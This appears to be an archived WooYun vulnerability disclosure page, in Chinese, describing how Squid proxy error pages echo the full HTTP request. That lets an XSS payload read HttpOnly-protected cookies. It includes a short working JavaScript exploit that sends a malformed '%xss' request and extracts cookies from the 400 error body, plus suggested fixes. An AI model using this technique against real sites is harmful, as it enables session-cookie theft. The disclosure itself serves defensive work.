@@ -1,0 +1,261 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		利用squid轻松获取经http only保护的cookie内容  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		利用squid轻松获取经http only保护的cookie内容  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/nyannyannyan">nyannyannyan</a> 
+</li><li>提交时间：		2013-06-07 14:10</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-06-07：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-09-05：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">Squid cache（简称为Squid）是一个流行的自由软件（GNU通用公共许可证）的代理服务器和Web缓存服务器。Squid有广泛的用途，从作为网页服务器的前置cache服务器缓存相关请求来提高Web服务器的速度，到为一组人共享网络资源而缓存万维网，域名系统和其他网络搜索，到通过过滤流量帮助网络安全，到局域网通过代理上网。Squid主要设计用于在Linux一类系统运行。<br />
+现在成为XSS的帮凶有木有= =</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">发现这个漏洞的缘起在于一次XSS...<br />
+<br />
+成功插入代码以后发现目标cookie是HTTP-Only的...<br />
+<br />
+按说，到这时候应当放弃了...但是啊...我们大学有个神奇的cache服务器叫做squid...<br />
+<br />
+研究了一下....发现结合squid的错误机制是可以做到bypass http-only的<br />
+<br />
+<br />
+<br />
+我们的目标错误是400: Bad Request<br />
+<br />
+这个错误最容易通过浏览器Ajax触发（触发方式将在下面说明）<br />
+<br />
+对应的错误模板文件为errors/en/ERR_INVALID_REQ<br />
+<br />
+让我们打开看一下....虽说习惯很不好....居然只有一行....<br />
+<br />
+不过重整一下还是很快找到了关键的部位<br />
+<br />
+</p><p class="detail"><a href="../images/07124815897d9df1128d47868f185f70e151caeb.jpg" target="_blank"><img src="../images/07124815897d9df1128d47868f185f70e151caeb.jpg" alt="p1.JPG" width="600"/></a></p><p class="detail"><br />
+<br />
+这个%R是什么意思呢<br />
+<br />
+http://wiki.squid-cache.org/Features/CustomErrors#ERR_.2A_template_codes_for_embedding<br />
+<br />
+看看这里<br />
+<br />
+%R<br />
+<br />
+Full HTTP Request<br />
+<br />
+全部Request啊...那么意味着发出的cookie也可以方便的获取....不管是不是http-only的<br />
+<br />
+<br />
+<br />
+试一下...<br />
+<br />
+使用的网络是某大学的网络，squid版本为2.6/STABLE21<br />
+<br />
+(有点老了，但是刚刚拖了最新的3.3.5版本下来看，这个问题没有被修过)<br />
+<br />
+</p><p class="detail"><a href="../images/0713042762917ef6eb0931c84120ec10d22b918a.jpg" target="_blank"><img src="../images/0713042762917ef6eb0931c84120ec10d22b918a.jpg" alt="p2.JPG" width="600"/></a></p><p class="detail"><br />
+<br />
+随便用一个网站，我用的是百度...这有俩httponly的cookie<br />
+<br />
+然后构造畸形ajax请求<br />
+<br />
+</p><p class="detail"><a href="../images/071307127890d122e833552602fb147e65d4a23e.jpg" target="_blank"><img src="../images/071307127890d122e833552602fb147e65d4a23e.jpg" alt="p3.JPG" width="600"/></a></p><p class="detail"><br />
+<br />
+关键就在于那个%号<br />
+<br />
+这会让squid认为这是一个不合法的request method从而抛出bad request<br />
+<br />
+拿一下请求头<br />
+<br />
+</p><p class="detail"><a href="../images/071312157648cf0d6c4929a1eb36ce2de08fb550.jpg" target="_blank"><img src="../images/071312157648cf0d6c4929a1eb36ce2de08fb550.jpg" alt="p4.JPG" width="600"/></a></p><p class="detail"><br />
+<br />
+然后发现httponly的SSUDB和SSUDBTSP就这样拿到了<br />
+<br />
+顺便吐槽一下百度，尼玛BDUSS和SSUDB是一样的内容你SSUDB是httponly的有毛意义<br />
+<br />
+<br />
+<br />
+危害及局限：<br />
+<br />
+1.XSS的大帮凶，httponly就这样轻轻松松bypass<br />
+<br />
+2.主要适用于定点打击吧...不过写一小段脚本探测一下内网环境也是可以的<br />
+<br />
+3.https协议下的请求因为不走cache服务器当然是拿不到的了<br />
+<br />
+<br />
+<br />
+综上所述，自评10rank<br />
+<br />
+<br />
+<br />
+最后送上一小段exploit<br />
+<br />
+</p><pre><code>function getCookieOrHeader(){<br />
+var res= document.cookie;<br />
+//Test Squid<br />
+var r;<br />
+if(window.XMLHttpRequest) {<br />
+r = new XMLHttpRequest();<br />
+}<br />
+else {<br />
+try {<br />
+r = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);<br />
+}<br />
+catch(e) {<br />
+r = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);<br />
+}<br />
+}<br />
+r.open(&#039;%xss&#039;, &#039;/&#039;, false);<br />
+r.send();<br />
+if(r.status == 400 &amp;&amp; r.responseText.search(&quot;squid&quot;) != -1) {<br />
+var s = r.responseText.search(/&lt;pre&gt;/ig) + 6;<br />
+var l = r.responseText.search(/&lt;\/pre&gt;/ig) - s;<br />
+res = r.responseText.substr(s, l);<br />
+}<br />
+return res;<br />
+}</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/0713042762917ef6eb0931c84120ec10d22b918a.jpg" target="_blank"><img src="../images/0713042762917ef6eb0931c84120ec10d22b918a.jpg" alt="p2.JPG" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/071307127890d122e833552602fb147e65d4a23e.jpg" target="_blank"><img src="../images/071307127890d122e833552602fb147e65d4a23e.jpg" alt="p3.JPG" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/071312157648cf0d6c4929a1eb36ce2de08fb550.jpg" target="_blank"><img src="../images/071312157648cf0d6c4929a1eb36ce2de08fb550.jpg" alt="p4.JPG" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">首先我是建议squid开发者避免在错误页面里面包含过于详细的请求头<br />
+<br />
+其次希望使用squid的团体或个人在生产环境时一定要自定义错误页面方式敏感信息外泄 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/nyannyannyan" title="nyannyannyan">nyannyannyan</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-025343" title="利用squid轻松获取经http only保护的cookie内容">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="25343";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
